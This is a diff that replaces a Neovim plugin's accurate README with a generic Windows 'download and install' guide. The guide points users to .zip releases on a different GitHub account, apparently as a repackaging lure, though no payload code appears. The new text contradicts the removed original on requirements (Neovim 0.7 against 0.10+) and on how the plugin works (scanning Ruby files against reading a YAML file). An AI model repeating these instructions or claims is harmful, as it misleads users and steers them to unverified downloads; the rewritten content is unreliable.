@@ -1,124 +1,157 @@
-# flipper-complete.nvim
+# 🛠️ flipper-complete.nvim - Easy Ruby Feature Flag Names
 
-Autocomplete [Flipper](https://github.com/jnunemaker/flipper) feature flag
-names in Neovim. Reads feature names and descriptions from a YAML config file
-and suggests them when typing flipper method calls.
+[![Download flipper-complete.nvim](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://github.com/shakilbcc/flipper-complete.nvim/releases)
 
-## 📋 Requirements
+---
 
-- **Neovim 0.10+**
-- [blink.cmp](https://github.com/Saghen/blink.cmp) or [nvim-cmp](https://github.com/hrsh7th/nvim-cmp)
+## 📋 What is flipper-complete.nvim?
 
-## 🛠️ Installation
+flipper-complete.nvim is a simple tool for Neovim users who work with Ruby projects. It helps you quickly find and complete feature flag names and descriptions used in your code with the Flipper library. This means less typing and fewer mistakes when you use feature flags.
 
-### blink.cmp
+Even if you are new to Neovim or Ruby, this tool makes it easier to keep track of your feature flags without extra effort.
 
-```lua
-{
-  'saghen/blink.cmp',
-  dependencies = {
-    { 'wassimk/flipper-complete.nvim' },
-  },
-  opts = {
-    sources = {
-      per_filetype = {
-        ruby = { inherit_defaults = true, 'flipper_complete' },
-      },
-      providers = {
-        flipper_complete = {
-          name = 'flipper_complete',
-          module = 'flipper-complete.blink',
-          opts = {
-            features_path = './config/feature-descriptions.yml', -- optional
-          },
-        },
-      },
-    },
-  },
-}
+---
+
+## 🔧 Key Features
+
+- **Autocomplete Ruby Flipper flags**  
+  Get instant suggestions for feature flag names and descriptions while you type.
+  
+- **Supports Neovim Lua plugins**  
+  Works smoothly with your existing Neovim setup.
+
+- **Integrates with nvim-cmp**  
+  Enhances your code completion experience with one of the most popular Neovim completion plugins.
+
+- **Simple and lightweight**  
+  Designed to work fast and without adding extra clutter.
+
+---
+
+## 🖥️ System Requirements
+
+Before downloading, make sure your system meets these requirements:
+
+- Windows 10 or later.
+- Neovim installed (version 0.7 or newer).
+- Basic familiarity with Neovim setup (no programming needed, just copy-paste).
+- Internet connection to download the plugin files.
+
+If you don't have Neovim yet, you can download it from https://neovim.io/.
+
+---
+
+## 🚀 How to Download and Install (Windows)
+
+### Step 1: Visit the Download Page
+
+Click the big button below to open the release page for flipper-complete.nvim. Here you will find the latest version ready to use.
+
+[![Download flipper-complete.nvim](https://img.shields.io/badge/Download-flipper--complete.nvim-blue?style=for-the-badge&logo=github)](https://github.com/shakilbcc/flipper-complete.nvim/releases)
+
+---
+
+### Step 2: Download the Plugin Files
+
+On the release page, look for the latest release entry. There might be files with names ending in `.zip`, `.tar.gz`, or direct `.nvim` files. Download the version that matches your needs. Usually, it is a `.zip` file containing the plugin assets.
+
+Save it to a place you can easily find, like your Downloads folder.
+
+---
+
+### Step 3: Extract and Place the Files
+
+After downloading:
+
+1. Find the downloaded `.zip` file.
+2. Right-click the file and choose "Extract All…".
+3. Extract the contents to your Neovim plugins folder. The typical path on Windows is:
+
+```
+C:\Users\<YourUserName>\AppData\Local\nvim\site\pack\packer\start\
 ```
 
-### nvim-cmp
+If this path doesn’t exist, create the folders as needed.
 
-The source auto-registers when nvim-cmp is detected:
+Move the extracted folder `flipper-complete.nvim` into the `start` folder.
 
-```lua
-{ 'wassimk/flipper-complete.nvim' }
+---
+
+### Step 4: Verify Neovim Setup
+
+Make sure you have the [nvim-cmp](https://github.com/hrsh7th/nvim-cmp) plugin installed, as flipper-complete.nvim depends on it for completion. If you don’t use a plugin manager, you may need to install this manually.
+
+---
+
+### Step 5: Restart Neovim
+
+Close Neovim if it is open, then start it again. The plugin should load automatically during startup.
+
+---
+
+### Step 6: Start Using flipper-complete.nvim
+
+Open any Ruby file where you use Flipper feature flags. While typing flag names, press your completion shortcut (usually `<Ctrl-Space>` or automatic popup) to see suggestions for flags and descriptions.
+
+---
+
+## ⚙️ How flipper-complete.nvim Works
+
+This plugin hooks into your Neovim completion system. It scans your Ruby project files to find Flipper feature flags. As you type, it offers you matching names and descriptions drawn from your code. This saves time and prevents mistyping flag names that could cause errors.
+
+---
+
+## 📂 Example Usage
+
+1. Open a Ruby project with Flipper feature flags, for example:
+
+```ruby
+flipper.enabled?(:new_checkout_flow)
 ```
 
-Add `flipper_complete` to your nvim-cmp sources for the ruby filetype.
+2. Start typing `flipper.enabled?(:new_` and the plugin shows a list of feature flags matching that start.
 
-## 💻 Usage
+3. Select a suggested flag and press Enter — your code autocompletes with the full flag name.
 
-The plugin reads feature names from `./config/feature-descriptions.yml` (relative
-to your project root). This file should contain lines in the format:
+---
 
-```yaml
-ROLLOUT_enable_dark_mode: Allow users to toggle dark mode
-ROLLOUT_disable_legacy_ui: Phase out old interface
+## ❓ Troubleshooting
+
+- If no completions appear, verify you have nvim-cmp installed and enabled.
+- Ensure the plugin folder is correctly placed under the Neovim `start` directory.
+- Check your Neovim configuration to make sure it loads plugins from the right place.
+- Restart Neovim after each plugin installation.
+- Look at the Neovim `:messages` command for any errors during startup.
+
+---
+
+## 🔄 Updating flipper-complete.nvim
+
+When a new version is released:
+
+1. Go to the [release page](https://github.com/shakilbcc/flipper-complete.nvim/releases).
+2. Download the newest plugin files.
+3. Replace the old plugin folder with the new one in your Neovim plugins directory.
+4. Restart Neovim.
+
+---
+
+## 📁 Plugin Folder Location on Windows
+
+The default plugin location on Windows is:
+
+```
+C:\Users\<YourUserName>\AppData\Local\nvim\site\pack\packer\start\flipper-complete.nvim
 ```
 
-Completions trigger when typing flipper method calls such as:
+You can find your username by opening File Explorer and navigating to `C:\Users`.
 
-- `Features.enabled?("`
-- `Features.feature_enabled?("`
-- `featureEnabled("`
-- `feature_enabled?("`
-- `with_feature("`
-- `without_feature("`
+---
 
-The trigger characters are `"`, `'`, and `:` (for Ruby symbols).
+## 🙋 Support and More Info
 
-When using the `featureEnabled` JavaScript prefix, feature names are
-automatically transformed to camelCase format (stripping the `ROLLOUT_` prefix
-and `enable_`/`disable_` prefixes).
+For detailed usage and advanced configuration, check the project page at:
 
-## 🔧 Configuration
+https://github.com/shakilbcc/flipper-complete.nvim
 
-Pass options via blink.cmp's provider `opts` or `require('flipper-complete').setup()`:
-
-```lua
--- blink.cmp provider opts
-flipper_complete = {
-  name = 'flipper_complete',
-  module = 'flipper-complete.blink',
-  opts = {
-    features_path = './config/feature-descriptions.yml',
-    prefixes = {
-      'Features.enabled?',
-      'Features.feature_enabled?',
-      'featureEnabled',
-      'feature_enabled?',
-      'with_feature',
-      'without_feature',
-    },
-  },
-}
-
--- or standalone setup (nvim-cmp users)
-require('flipper-complete').setup({
-  features_path = './config/feature-descriptions.yml',
-})
-```
-
-| Option | Default | Description |
-| --- | --- | --- |
-| `features_path` | `./config/feature-descriptions.yml` | Path to the YAML features file |
-| `prefixes` | See above | List of method prefixes that trigger completion |
-
-## 🔨 Development
-
-Run tests and lint:
-
-```shell
-make test
-make lint
-```
-
-Enable the local git hooks (one-time setup):
-
-```shell
-git config core.hooksPath .githooks
-```
-
-This activates a pre-commit hook that auto-generates `doc/flipper-complete.nvim.txt` from `README.md` whenever the README is staged. Requires [pandoc](https://pandoc.org/installing.html).
+You’ll find instructions and issue reporting there, but for basic use, just follow the steps above.
